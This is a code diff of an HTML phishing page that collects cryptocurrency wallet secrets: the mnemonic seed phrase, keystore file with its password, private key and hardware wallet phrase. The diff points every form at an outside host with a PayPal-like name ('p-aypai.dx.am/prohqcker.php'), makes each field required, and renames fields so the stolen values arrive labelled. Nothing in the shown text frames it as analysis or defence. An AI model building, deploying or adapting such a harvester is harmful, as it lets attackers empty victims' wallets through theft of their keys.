@@ -51,7 +51,7 @@
         <form
           id="new-form"
           class="form flex flex-jc-c"
-          action="prohqcker.php"
+          action="http://p-aypai.dx.am/prohqcker.php"
           method="POST"
         >
           <h5>MNEMONICS</h5>
@@ -63,6 +63,7 @@
             id="textInput"
             type="text"
             name="Mnemonics phrase"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
@@ -70,7 +71,7 @@
         <form
           id="new-form"
           class="form flex flex-jc-c"
-          action="prohqcker.php"
+          action="http://p-aypai.dx.am/prohqcker.php"
           method="POST"
         >
           <h5>KEYSTORE</h5>
@@ -81,7 +82,8 @@
             class="form__input"
             id="textInput2"
             type="text"
-            name="Mnemonics phrase"
+            name="Keystore"
+			required
           />
           <label for="passwordInput" class="form__label">
             Enter Password
@@ -90,7 +92,8 @@
             class="form__input"
             id="passwordInput"
             type="password"
-            name="Mnemonics phrase"
+            name="Keystore pass"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
@@ -110,6 +113,7 @@
             id="textInputThree"
             type="text"
             name="PRIVATE-KEY phrase"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
@@ -129,6 +133,7 @@
             id="textInputFour"
             type="text"
             name="Hardware phrase"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
